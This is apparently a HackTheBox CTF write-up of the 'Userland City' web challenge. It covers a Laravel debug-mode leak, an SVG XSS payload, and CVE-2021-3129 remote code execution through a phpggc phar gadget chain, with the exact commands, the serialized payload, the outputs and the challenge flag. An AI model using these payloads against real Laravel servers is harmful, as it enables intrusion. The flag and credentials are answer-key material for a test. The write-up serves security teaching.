---
Category:
  - Web
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags:
  - RCE
  - laravel
  - laravel-debug_mode
  - php-deserialization
  - Linux
---
>[!quote]
> *You are part of a multinational law enforcement operation called "Takeover" that targets underground darknet markets, the new target is a referral only market called Userland City. After a string of ops intercepting traffic in TOR exit nodes, we managed to obtain a verified vendor's account that goes by the name of **lxkid**. We're ready for stage "Downfall", Europol has provided us with key software components to capture cleartext credentials from all marketplace users, spyware to deliver through key accounts operating with downloadable deliveries, and help us remove the existing image database including the metadata removal tool. Old IRC logs from one of those devs suggest that the marketplace is built on top of the latest Laravel version and debug mode is enabled. The credentials of the vendor's account are `lxkid02:8rsNN9ohfLp69cVRFEgk4Qzs`*


# Set up

- No local setup (black box challenge)

# Information Gathering

## The application at-a-glance 🔍

Login page:

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76.png)

>[!important]
>lxkid02     8rsNN9ohfLp69cVRFEgk4Qzs

Authenticated area:

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%201.png)

Categories API: 

- **category/1**
- **category/2**
- **category/3**

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%202.png)

Images uploaded on 

- **products/image/FQbAtgwHiR8Vo9wkWYBWR58SpX0TR3PLhn33wPQ2.jpeg**

About page:

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Update 07-07-2022:

I'm vacationing and will be unavailable for the next two weeks.
So I won't be able to review any products till then, so please
bear with me until things cool off. ~ @dread_pirate_roberts

Update 02-10-2020:

We've been tipped off that they're might be some fed in our
little lair, I've removed all vendors/customers I wasn't 100%
on. Now this marketplace is going to be referral links only,
and only verified people by me will be able to buy and sell.
Interpol are operating/seizing a lot of exit nodes, use https
and complex passwords and make sure you write down your mnemonic
key and enabled 2fa through PGP. Also make sure you're at the
right URL, we're not operating on any mirrors.

verify the URL against our PGP
userlandcityfiwucd6vxijskbhpjdyajmzeor4mc4i7yopvpo4p7cyd.onion

Update 12-09-2020:

We've removed the malware vendor @kleb201, we've detected some
suspicious activity from his account, I then investigated the
sample he emailed me against the actual product that a
dissatisfied customer forwarded me and it wasn't the same. If
you've bought from this vendor, your compromised hosts might
be backdoored. I currently don't know what he's/she's up to.
~ @dread_pirate_roberts

Update 09-08-2020:

We've updated the MacOS ransomware product to reduce detection
rates, if you're campaigning on BitTorrenting sites, make sure
you have our updated package (you can get it by emailing me your order id)
because you might be ruining it for everybody. We've circumvented
SPS and have added some anti-debugging techniques such as
P_TRACED/PTRACE_DENY_ATTACH, a generator for dynamic obfuscation,
and a process killer on products such as Little Snitch, Kaspersky,
Norton, Bullguard, Bitdefender, Avast, Norton, Mcaffee etc...
For backwards compatibility attempts on older MacOS version
we've added more checks in regard to process injections and
persistence to make sure that everything will get delivered
if it's compromised. ~ @mirajane

Update 23-07-2020:

Our verified @deltarloy  vendor got caught, if you have any
outstanding dropouts, DON'T ATTEND, feds might be trying to
lure low-hanging fruit. ~ @dread_pirate_roberts

Update 05-03-2020:

Wow this marketplace is popping off! We got a inquiry in regard
to the ICBC banking trojan, you can bypass the 2FA by forwarding
OTP received via SMS to the C2. The vendor has updated the
package, if you want that for your campaign, please shoot us a
email. ~ @kakegurui

Update 29-02-2020:

We've added instructions on receiving deliverables on /about,
this is going to be our new standard and all vendors will have
to adhere to it, be safe out there and most importantly keep
this market safe! ~ @dread_pirate_roberts

Update 05-03-2020:

I've removed all vendors that are re-selling on other markets.
Don't think I don't know who you are. ~ @dread_pirate_roberts
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCAAdFiEEEp9WygXs21c7bIddFHkqL393NPIFAl+IsisACgkQFHkqL393
NPJNWAgAqnHn2s1rXa5jXqzzv6fcXRPlZ5t7oOr4Kv1BWjlxegtI/oDMGN36dZVn
N0kAo9oF2FuuuV4ITmYUh8sN4D2U5ZDXut1pwCuv+OTPaJxbtuWiBzUFfVeSv6i2
qNUMCsRj9NDaBu3jrRJ0PBVpyna1UWngEtCNdBnGur27U2UzAkCf5KtNy9jbiPFI
0EJCg7X9n0jIFd+Kxs8aUDHf/7bVySXQ4BRvY3WaGuWklNUc+GZeU6VfpwFscpOK
8lL5tjzLtzV7hngEkT4gIZwcUKOnooPPw906qKCqPT7Tc22qkOGeF9XfA2IkAssW
NeprBghxPwuSxz83IGJmXvP4gh33Rg==
=fSxC
-----END PGP SIGNATURE-----
```

### Add new product

products/add

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%203.png)

```
POST /products/add HTTP/1.1
Host: 206.189.26.97:31334
Content-Length: 8103
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://206.189.26.97:31334
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2ohEDSY8OI5QuEwF
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://206.189.26.97:31334/products/add
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6Ikt5dDI0U0NqTExTZi9IcU9tR0dYM3c9PSIsInZhbHVlIjoiRTJ1VE9jQU4wOG9ZbTFtdU5qWkpicWs3bENDdDh0bkVRaTFDRVYyKzIxVlI1S3VRQ2dZSC91Lys0em9LYlBmQXpWaFkrR2JrNU5JTExDK20wdm1UdC9QeWgzenBzbXpOSS96QU5YdjEvQUUranhTaUJydlowMjVYN1pYU1ExUWciLCJtYWMiOiI3Y2Q5YTk4MDU5ZDc0MGZhZmM1NTRlYzE4YThhNmMxMTMzNDE3MWRmNGRhYzBhMTFkODcxYTM2YzBjMTQ4OWZkIn0%3D; laravel_session=eyJpdiI6Iko0RWlJY0pLb3lGaGp5bWlzNWxJWnc9PSIsInZhbHVlIjoibjd3ZXpLSlJaNVI2cEJTL29GWFl3Z1RVK2NxckV2U2tyOHhpM2UxTE5aM3BUdWEzNlpDcnhDbVJZS3RybEozaCtFSjl0NW5ENTd1QUhPNEFuNUhPdEI4eVMxd3dIUS9FMWRPZkxhSDVlQ05FY08vSXpmcmFhV1QvdVNSSlJmaEQiLCJtYWMiOiI5MDhkNmE4ZTQzMjc5MTg3MWE1ZWMzYWM0ZGZmZGE1ZGFmNjA0MThiNTFmZjk2YTIyYTlkODgzNzEwODRkMzdlIn0%3D
Connection: close

------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="_token"

uN0HHZyB0hVQgf7lEqGjdVq31Ur274XNnxqW1ycU
------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="name"

<b>Test</b>
------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="category"

1
------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="description"

<b>Test description</b>
------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="image"; filename="charizard.jpeg"
Content-Type: image/jpeg

ÿØÿà
...

------WebKitFormBoundary2ohEDSY8OI5QuEwF
Content-Disposition: form-data; name="price"

0.01
------WebKitFormBoundary2ohEDSY8OI5QuEwF--
```

## Source code review

N/A - Source code not provided

# The Bug

## Laravel Debug Mode - Stack traces

Uploading a PHP web shell we obtain the following error:

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%204.png)

>[!info]
>Environment information
>Laravel version: 8.10.0
>Laravel locale: en
>Laravel config cached: false
>PHP version: 7.4.28

Leaked application code:

```php
            'image'         => $image->hashName(),
            'price'         => $request->input('price'),
            'is_published'  => false
        ]);
 
        return redirect('/products');
    }
 
    public function show(Product $product)
    {
        if (!$product->is_published) return abort(403);
        return view('products.show', ['product' => $product]);
    }
 
    public function getImage(string $filename)
    {
        chdir('storage/images');
        if (!File::exists($filename))
        {
            return abort(404);
        }
 
        if (!Str::startsWith(File::mimeType($filename), 'image/'))
        {
            return abort(400);
        }
 
        return response()->file($filename);
    }
}
```

- Full error:
    
    ```html
    <!doctype html>
    <html class="theme-light">
    <!--
    Symfony\Component\HttpKernel\Exception\HttpException:  in file /www/vendor/laravel/framework/src/Illuminate/Foundation/Application.php on line 1071
    
    #0 /www/vendor/laravel/framework/src/Illuminate/Foundation/helpers.php(44): Illuminate\Foundation\Application-&gt;abort()
    #1 /www/app/Http/Controllers/ProductsController.php(63): abort()
    #2 [internal function]: App\Http\Controllers\ProductsController-&gt;getImage()
    #3 /www/vendor/laravel/framework/src/Illuminate/Routing/Controller.php(54): call_user_func_array()
    #4 /www/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(45): Illuminate\Routing\Controller-&gt;callAction()
    #5 /www/vendor/laravel/framework/src/Illuminate/Routing/Route.php(255): Illuminate\Routing\ControllerDispatcher-&gt;dispatch()
    #6 /www/vendor/laravel/framework/src/Illuminate/Routing/Route.php(197): Illuminate\Routing\Route-&gt;runController()
    #7 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(691): Illuminate\Routing\Route-&gt;run()
    #8 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(128): Illuminate\Routing\Router-&gt;Illuminate\Routing\{closure}()
    #9 /www/vendor/laravel/framework/src/Illuminate/Routing/Middleware/SubstituteBindings.php(41): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #10 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Routing\Middleware\SubstituteBindings-&gt;handle()
    #11 /www/vendor/laravel/framework/src/Illuminate/Auth/Middleware/Authenticate.php(44): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #12 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Auth\Middleware\Authenticate-&gt;handle()
    #13 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/VerifyCsrfToken.php(77): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #14 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\VerifyCsrfToken-&gt;handle()
    #15 /www/vendor/laravel/framework/src/Illuminate/View/Middleware/ShareErrorsFromSession.php(49): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #16 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\View\Middleware\ShareErrorsFromSession-&gt;handle()
    #17 /www/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php(121): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #18 /www/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php(63): Illuminate\Session\Middleware\StartSession-&gt;handleStatefulRequest()
    #19 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Session\Middleware\StartSession-&gt;handle()
    #20 /www/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/AddQueuedCookiesToResponse.php(37): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #21 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse-&gt;handle()
    #22 /www/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/EncryptCookies.php(67): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #23 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Cookie\Middleware\EncryptCookies-&gt;handle()
    #24 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #25 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(693): Illuminate\Pipeline\Pipeline-&gt;then()
    #26 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(668): Illuminate\Routing\Router-&gt;runRouteWithinStack()
    #27 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(634): Illuminate\Routing\Router-&gt;runRoute()
    #28 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(623): Illuminate\Routing\Router-&gt;dispatchToRoute()
    #29 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(166): Illuminate\Routing\Router-&gt;dispatch()
    #30 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(128): Illuminate\Foundation\Http\Kernel-&gt;Illuminate\Foundation\Http\{closure}()
    #31 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/TransformsRequest.php(21): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #32 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\TransformsRequest-&gt;handle()
    #33 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/TransformsRequest.php(21): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #34 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\TransformsRequest-&gt;handle()
    #35 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/ValidatePostSize.php(27): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #36 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\ValidatePostSize-&gt;handle()
    #37 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/PreventRequestsDuringMaintenance.php(87): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #38 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\PreventRequestsDuringMaintenance-&gt;handle()
    #39 /www/vendor/fruitcake/laravel-cors/src/HandleCors.php(37): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #40 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Fruitcake\Cors\HandleCors-&gt;handle()
    #41 /www/vendor/fideloper/proxy/src/TrustProxies.php(57): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #42 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Fideloper\Proxy\TrustProxies-&gt;handle()
    #43 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #44 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\Pipeline\Pipeline-&gt;then()
    #45 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\Foundation\Http\Kernel-&gt;sendRequestThroughRouter()
    #46 /www/public/index.php(52): Illuminate\Foundation\Http\Kernel-&gt;handle()
    #47 {main}
    -->
    <head>
        <!-- Hide dumps asap -->
        <style>
            pre.sf-dump {
                display: none !important;
            }
        </style>
    
        <meta charset="UTF-8">
        <meta name="viewport"
              content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <meta name="robots" content="noindex, nofollow">
    
        <title>🧨 </title>
    
        
    </head>
    <body class="scrollbar-lg">
    
    <script> <...></script>
    
    <noscript><pre>Symfony\Component\HttpKernel\Exception\HttpException:  in file /www/vendor/laravel/framework/src/Illuminate/Foundation/Application.php on line 1071
    
    #0 /www/vendor/laravel/framework/src/Illuminate/Foundation/helpers.php(44): Illuminate\Foundation\Application-&gt;abort()
    #1 /www/app/Http/Controllers/ProductsController.php(63): abort()
    #2 [internal function]: App\Http\Controllers\ProductsController-&gt;getImage()
    #3 /www/vendor/laravel/framework/src/Illuminate/Routing/Controller.php(54): call_user_func_array()
    #4 /www/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(45): Illuminate\Routing\Controller-&gt;callAction()
    #5 /www/vendor/laravel/framework/src/Illuminate/Routing/Route.php(255): Illuminate\Routing\ControllerDispatcher-&gt;dispatch()
    #6 /www/vendor/laravel/framework/src/Illuminate/Routing/Route.php(197): Illuminate\Routing\Route-&gt;runController()
    #7 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(691): Illuminate\Routing\Route-&gt;run()
    #8 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(128): Illuminate\Routing\Router-&gt;Illuminate\Routing\{closure}()
    #9 /www/vendor/laravel/framework/src/Illuminate/Routing/Middleware/SubstituteBindings.php(41): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #10 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Routing\Middleware\SubstituteBindings-&gt;handle()
    #11 /www/vendor/laravel/framework/src/Illuminate/Auth/Middleware/Authenticate.php(44): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #12 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Auth\Middleware\Authenticate-&gt;handle()
    #13 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/VerifyCsrfToken.php(77): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #14 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\VerifyCsrfToken-&gt;handle()
    #15 /www/vendor/laravel/framework/src/Illuminate/View/Middleware/ShareErrorsFromSession.php(49): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #16 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\View\Middleware\ShareErrorsFromSession-&gt;handle()
    #17 /www/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php(121): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #18 /www/vendor/laravel/framework/src/Illuminate/Session/Middleware/StartSession.php(63): Illuminate\Session\Middleware\StartSession-&gt;handleStatefulRequest()
    #19 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Session\Middleware\StartSession-&gt;handle()
    #20 /www/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/AddQueuedCookiesToResponse.php(37): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #21 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse-&gt;handle()
    #22 /www/vendor/laravel/framework/src/Illuminate/Cookie/Middleware/EncryptCookies.php(67): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #23 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Cookie\Middleware\EncryptCookies-&gt;handle()
    #24 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #25 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(693): Illuminate\Pipeline\Pipeline-&gt;then()
    #26 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(668): Illuminate\Routing\Router-&gt;runRouteWithinStack()
    #27 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(634): Illuminate\Routing\Router-&gt;runRoute()
    #28 /www/vendor/laravel/framework/src/Illuminate/Routing/Router.php(623): Illuminate\Routing\Router-&gt;dispatchToRoute()
    #29 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(166): Illuminate\Routing\Router-&gt;dispatch()
    #30 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(128): Illuminate\Foundation\Http\Kernel-&gt;Illuminate\Foundation\Http\{closure}()
    #31 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/TransformsRequest.php(21): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #32 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\TransformsRequest-&gt;handle()
    #33 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/TransformsRequest.php(21): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #34 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\TransformsRequest-&gt;handle()
    #35 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/ValidatePostSize.php(27): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #36 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\ValidatePostSize-&gt;handle()
    #37 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Middleware/PreventRequestsDuringMaintenance.php(87): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #38 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Illuminate\Foundation\Http\Middleware\PreventRequestsDuringMaintenance-&gt;handle()
    #39 /www/vendor/fruitcake/laravel-cors/src/HandleCors.php(37): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #40 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Fruitcake\Cors\HandleCors-&gt;handle()
    #41 /www/vendor/fideloper/proxy/src/TrustProxies.php(57): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #42 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(167): Fideloper\Proxy\TrustProxies-&gt;handle()
    #43 /www/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\Pipeline\Pipeline-&gt;Illuminate\Pipeline\{closure}()
    #44 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\Pipeline\Pipeline-&gt;then()
    #45 /www/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\Foundation\Http\Kernel-&gt;sendRequestThroughRouter()
    #46 /www/public/index.php(52): Illuminate\Foundation\Http\Kernel-&gt;handle()
    #47 {main}
    </pre></noscript>
    
    <...>
    #47 {main}
    -->
    </body>
    </html>
    ```
    

### XSS using SVGs

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS");
   </script>
</svg>
```

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%205.png)

## Laravel 8.4.2 debug mode - Remote code execution (CVE-2021-3129

- [Laravel <= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce)
- [https://github.com/ambionics/laravel-exploits](https://github.com/ambionics/laravel-exploits)
- [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/49424)

# Exploitation - Laravel Deserialization (**CVE-2021-3129)**

Generated the phar file and tested the PoC:

```php
┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id

┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ python3 laravel-ignition-rce.py http://206.189.26.97:32508/ /tmp/exploit.phar
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=1000(www) gid=1000(www) groups=1000(www)
--------------------------
+ Logs cleared
```

Searched and read the flag:

```php
┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -f -o exploit.phar monolog/rce1 system 'ls /'

┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ cat exploit.phar
<?php __HALT_COMPILER(); ?>
|a:2:{i:7;O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:4:"ls /";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:4:"ls /";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}i:7;i:7;}dummyb
                                                                                                                                           ~test.txtb
                                                                                                                                                     ~ؤtesttestࣻgl)aByp@GBMB
┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ python3 laravel-ignition-rce.py http://206.189.26.97:32508/ exploit.phar
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
bin
boot
dev
entrypoint.sh
etc
flagVgprG
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
--------------------------
+ Logs cleared

┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -f -o exploit.phar monolog/rce1 system 'cat /flagVgprG'

┌──(maoutis㉿kali)-[~/CTF/HTB/UserlandCity/laravel-exploits]
└─$ python3 laravel-ignition-rce.py http://206.189.26.97:32508/ exploit.phar
+ Log file: /www/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
HTB{c4nt_p0p_th3s3_ch41n5!}
--------------------------
+ Logs cleared
```

### Exploit requests

Log detections:

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%206.png)

![Untitled](../../zzz_res/attachments/Userland%20City%20dd0873c147494910a26a7d3006a8ec76%207.png)

# Flag

>[!success]
>HTB{c4nt_p0p_th3s3_ch41n5!}

